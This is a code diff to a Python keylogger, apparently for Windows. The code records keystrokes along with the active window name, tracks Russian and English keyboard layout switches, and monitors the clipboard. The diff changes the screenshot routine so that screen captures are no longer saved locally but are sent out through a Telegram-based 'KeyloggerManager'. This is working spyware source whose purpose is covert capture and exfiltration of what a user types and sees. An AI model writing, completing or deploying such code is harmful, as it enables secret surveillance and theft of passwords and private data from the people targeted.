@@ -1,3 +1,4 @@
+from pynput.keyboard import Key, Listener
 import logging
 import getpass
 import threading
@@ -5,6 +6,7 @@ import time
 from pynput import keyboard
 import pyautogui
 import os
+from pynput.keyboard import Key, Listener
 from KeyloggerManager import TelegramKeylogger
 
 try:
@@ -88,23 +90,22 @@ def get_char_from_vk(vk_code, shift, layout):
         return f"[ERROR]"
 
 def check_alt_shift_in_log():
-    ...
-    # global current_layout
-    # alt_found = False
-    # shift_found = False
-    # while True:
-    #     try:
-    #         with open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', 'r', encoding='utf-8') as f:
-    #             lines = f.readlines()[-2:]
-    #         alt_found = any("Char: '[Key.alt_l]'" in line or "Char: '[Key.alt_r]'" in line for line in lines)
-    #         shift_found = any("Char: '[Key.shift]'" in line or "Char: '[Key.shift_r]'" in line for line in lines)
-    #         if alt_found and shift_found:
-    #             current_layout = "EN" if current_layout == "RU" else "RU"
-    #             logger.info(f"LAYOUT_SWITCHED by LogScan: {current_layout}")
-    #             time.sleep(1)
-    #     except Exception as e:
-    #         logger.error(f"Error reading logfile for layout switch: {e}")
-    #     time.sleep(1)
+    global current_layout
+    alt_found = False
+    shift_found = False
+    while True:
+        try:
+            with open('logfile.txt', 'r', encoding='utf-8') as f:
+                lines = f.readlines()[-2:]
+            alt_found = any("Char: '[Key.alt_l]'" in line or "Char: '[Key.alt_r]'" in line for line in lines)
+            shift_found = any("Char: '[Key.shift]'" in line or "Char: '[Key.shift_r]'" in line for line in lines)
+            if alt_found and shift_found:
+                current_layout = "EN" if current_layout == "RU" else "RU"
+                logger.info(f"LAYOUT_SWITCHED by LogScan: {current_layout}")
+                time.sleep(1)
+        except Exception as e:
+            logger.error(f"Error reading logfile for layout switch: {e}")
+        time.sleep(1)
 
 def on_press(key):
     global shift_pressed, alt_pressed, current_layout
@@ -144,7 +145,7 @@ def on_press(key):
 
         modifier_str = "+".join(modifiers) if modifiers else "NONE"
 
-        logger.info(f"{active_window} | Char: '{char}'")
+        logger.info(f"{active_window} | '{char}'")
 
     except Exception as e:
         logger.error(f"Error in on_press: {e}")
@@ -175,18 +176,20 @@ def clipboard_monitor(interval=5):
 def screenshot_monitor(interval=30):
     count = 0
     while True:
-        filename = f'screenshots/screenshot_{int(time.time())}_{count}.png'
         try:
             img = pyautogui.screenshot()
-            img.save(filename)
-            logger.info(f"Screenshot saved: {filename}")
+
+            success = keylogger_manager.send_screenshot(img)
+
+            if success:
+                logger.info(f"Screenshot sent successfully #{count}")
+            else:
+                logger.error(f"Failed to send screenshot #{count}")
+
         except Exception as e:
             logger.error(f"Error taking screenshot: {e}")
         count += 1
         time.sleep(interval)
-
-if not os.path.exists('screenshots'):
-    os.makedirs('screenshots')
 
 logger.info(f"PROGRAM_STARTED | Initial layout: {current_layout}")
 
